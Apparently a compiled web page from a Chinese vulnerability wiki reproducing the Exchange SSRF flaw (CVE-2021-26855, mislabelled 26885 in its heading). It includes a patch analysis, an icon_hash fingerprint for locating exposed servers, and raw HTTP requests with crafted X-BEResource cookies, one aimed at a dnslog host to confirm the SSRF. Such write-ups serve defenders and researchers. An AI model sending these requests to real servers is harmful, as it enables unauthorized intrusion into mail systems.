(window.webpackJsonp=window.webpackJsonp||[]).push([[84],{1898:function(e,s,a){e.exports=a.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220311182746644.d529a8e8.png"},1899:function(e,s,a){e.exports=a.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220311182746353.2af3cd47.png"},1900:function(e,s,a){e.exports=a.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220311182746419.a379cc60.png"},1901:function(e,s,a){e.exports=a.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220311182746711.495dc370.png"},1902:function(e,s,a){e.exports=a.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220311182746597.ececf30e.png"},3169:function(e,s,a){"use strict";a.r(s);var n=a(64),t=Object(n.a)({},(function(){var e=this,s=e._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[s("h1",{attrs:{id:"microsoft-exchange-ssrf漏洞-cve-2021-26885"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#microsoft-exchange-ssrf漏洞-cve-2021-26885"}},[e._v("#")]),e._v(" Microsoft Exchange SSRF漏洞 CVE-2021-26885")]),e._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[e._v("#")]),e._v(" 漏洞描述")]),e._v(" "),s("p",[e._v("Exchange Server 是微软公司的一套电子邮件服务组件，是个消息与协作系统。2021年03月3日，微软官方发布了Microsoft Exchange安全更新，披露了多个高危严重漏洞，其中：在 CVE-2021-26855 Exchange SSRF漏洞中，攻击者可直接构造恶意请求，以Exchange server的身份发起任意HTTP请求，扫描内网，并且可获取Exchange用户信息。该漏洞利用无需身份认证")]),e._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[e._v("#")]),e._v(" 漏洞影响")]),e._v(" "),s("a-checkbox",{attrs:{checked:""}},[e._v("Exchange 2013 Versions < 15.00.1497.012,")]),s("br"),e._v(" "),s("a-checkbox",{attrs:{checked:""}},[e._v("Exchange 2016 CU18 < 15.01.2106.013,")]),s("br"),e._v(" "),s("a-checkbox",{attrs:{checked:""}},[e._v("Exchange 2016 CU19 < 15.01.2176.009,")]),s("br"),e._v(" "),s("a-checkbox",{attrs:{checked:""}},[e._v("Exchange 2019 CU7 < 15.02.0721.013,")]),s("br"),e._v(" "),s("a-checkbox",{attrs:{checked:""}},[e._v("Exchange 2019 CU8 < 15.02.0792.010")]),s("br"),e._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[e._v("#")]),e._v(" 网络测绘")]),e._v(" "),s("a-checkbox",{attrs:{checked:""}},[e._v('icon_hash="1768726119"')]),s("br"),e._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[e._v("#")]),e._v(" 漏洞复现")]),e._v(" "),s("p",[e._v("与 SSRF 有关的文件")]),e._v(" "),s("div",{staticClass:"language-plain line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-plain"}},[s("code",[e._v("/owa/auth/Current/themes/resources/logon.css\n/owa/auth/Current/themes/resources/...\n/ecp/default.flt\n/ecp/main.css\n/ecp/<single char>.js\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br"),s("span",{staticClass:"line-number"},[e._v("2")]),s("br"),s("span",{staticClass:"line-number"},[e._v("3")]),s("br"),s("span",{staticClass:"line-number"},[e._v("4")]),s("br"),s("span",{staticClass:"line-number"},[e._v("5")]),s("br")])]),s("p",[e._v("查看补丁中的改变，可以看到有关 "),s("code",[e._v("BackEndServer")]),e._v(" 使用的类关于 "),s("code",[e._v("BEResourceRequestHandler")]),e._v(" 的改变")]),e._v(" "),s("p",[s("img",{attrs:{src:a(1898),alt:"img"}})]),e._v(" "),s("p",[e._v("修复 BEResourceRequestHandler 使用的 BakcEndServer类的补丁")]),e._v(" "),s("p",[s("img",{attrs:{src:a(1899),alt:"img"}})]),e._v(" "),s("p",[e._v("查看调用"),s("code",[e._v("BERsourceRequestHandler")]),e._v(" 的方法 "),s("code",[e._v("SelectHandlerForUnauthenticatedRequest")]),e._v(" 查找相关路径 "),s("code",[e._v("ProxyMoudle")])]),e._v(" "),s("p",[s("img",{attrs:{src:a(1900),alt:"img"}})]),e._v(" "),s("p",[e._v("可以从中看到需要带有 EXP协议(例如路径 /ecp/), Cookie参数 "),s("code",[e._v("X-BEResponse")]),e._v(", 还有以静态扩展名结尾的 URL (例如 x.js, x.css等)")]),e._v(" "),s("p",[e._v("而其中的请求为 HttpProxy 来实现的，所以大部分的POC中请求的文件为"),s("code",[e._v("/etc/y.js")]),e._v(" 这样类似不存在的文件")]),e._v(" "),s("p",[e._v("参数 "),s("code",[e._v("X-BEResource")]),e._v(" 解析在 "),s("code",[e._v("BackEndServer.FromString")])]),e._v(" "),s("p",[e._v("跟踪 "),s("code",[e._v("BackEndServer")]),e._v("对象， 其中该对象使用 "),s("code",[e._v("ProxyRequestHandler")]),e._v(" 向主机发送请求")]),e._v(" "),s("p",[s("img",{attrs:{src:a(1901),alt:"img"}})]),e._v(" "),s("p",[e._v("这里进行SSRF的漏洞复现，首先访问 "),s("code",[e._v("/ecp/test11.js")]),e._v(" 文件")]),e._v(" "),s("p",[e._v("并设置Cookie "),s("code",[e._v("X-BEResource=test_wiki/api/endpoint#~1; X-AnonResource=true")])]),e._v(" "),s("div",{staticClass:"language-plain line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-plain"}},[s("code",[e._v('GET /ecp/test11.js HTTP/1.1\nHost: \nConnection: close\nsec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"\nsec-ch-ua-mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36\nAccept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: no-cors\nSec-Fetch-Dest: image\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6\nCookie: X-BEResource=test_wiki/api/endpoint#~1; X-AnonResource=true\n')])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br"),s("span",{staticClass:"line-number"},[e._v("2")]),s("br"),s("span",{staticClass:"line-number"},[e._v("3")]),s("br"),s("span",{staticClass:"line-number"},[e._v("4")]),s("br"),s("span",{staticClass:"line-number"},[e._v("5")]),s("br"),s("span",{staticClass:"line-number"},[e._v("6")]),s("br"),s("span",{staticClass:"line-number"},[e._v("7")]),s("br"),s("span",{staticClass:"line-number"},[e._v("8")]),s("br"),s("span",{staticClass:"line-number"},[e._v("9")]),s("br"),s("span",{staticClass:"line-number"},[e._v("10")]),s("br"),s("span",{staticClass:"line-number"},[e._v("11")]),s("br"),s("span",{staticClass:"line-number"},[e._v("12")]),s("br"),s("span",{staticClass:"line-number"},[e._v("13")]),s("br")])]),s("p",[e._v("用这样的方式请求可以确定是否存在 SSRF漏洞")]),e._v(" "),s("div",{staticClass:"language-plain line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-plain"}},[s("code",[e._v("响应包为:\nNegotiateSecurityContext failed with for host 'test_wiki' with status 'TargetUnknown'\n\n显示这样的就是可能存在了\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br"),s("span",{staticClass:"line-number"},[e._v("2")]),s("br"),s("span",{staticClass:"line-number"},[e._v("3")]),s("br"),s("span",{staticClass:"line-number"},[e._v("4")]),s("br")])]),s("p",[e._v("在通过发送一个请求给 Dnslog确认是否存在 SSRF给 Dnslog发送了一个请求")]),e._v(" "),s("div",{staticClass:"language-plain line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-plain"}},[s("code",[e._v('GET /owa/auth/test.js HTTP/1.1\nHost: \nConnection: close\nsec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"\nsec-ch-ua-mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36\nAccept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: no-cors\nSec-Fetch-Dest: image\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6\nCookie: X-AnonResource=true; X-AnonResource-Backend=ianqsx.dnslog.cn/ecp/default.flt?~3; X-BEResource=ianqsx.dnslog.cn/owa/auth/logon.aspx?~3;\n')])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br"),s("span",{staticClass:"line-number"},[e._v("2")]),s("br"),s("span",{staticClass:"line-number"},[e._v("3")]),s("br"),s("span",{staticClass:"line-number"},[e._v("4")]),s("br"),s("span",{staticClass:"line-number"},[e._v("5")]),s("br"),s("span",{staticClass:"line-number"},[e._v("6")]),s("br"),s("span",{staticClass:"line-number"},[e._v("7")]),s("br"),s("span",{staticClass:"line-number"},[e._v("8")]),s("br"),s("span",{staticClass:"line-number"},[e._v("9")]),s("br"),s("span",{staticClass:"line-number"},[e._v("10")]),s("br"),s("span",{staticClass:"line-number"},[e._v("11")]),s("br"),s("span",{staticClass:"line-number"},[e._v("12")]),s("br"),s("span",{staticClass:"line-number"},[e._v("13")]),s("br")])]),s("a-alert",{attrs:{type:"success",message:"Cookie: X-AnonResource=true; X-AnonResource-Backend=ianqsx.dnslog.cn/ecp/default.flt?~3; X-BEResource=ianqsx.dnslog.cn/owa/auth/logon.aspx?~3;",description:"",showIcon:""}}),e._v(" "),s("br"),e._v(" "),s("a-alert",{attrs:{type:"success",message:"将其中的 Dnslog换成自己的",description:"",showIcon:""}}),e._v(" "),s("br"),e._v(" "),s("p",[s("img",{attrs:{src:a(1902),alt:"img"}})]),e._v(" "),s("p",[e._v("确定收到了由服务端发送的请求，存在SSRF漏洞")])],1)}),[],!1,null,null,null);s.default=t.exports}}]);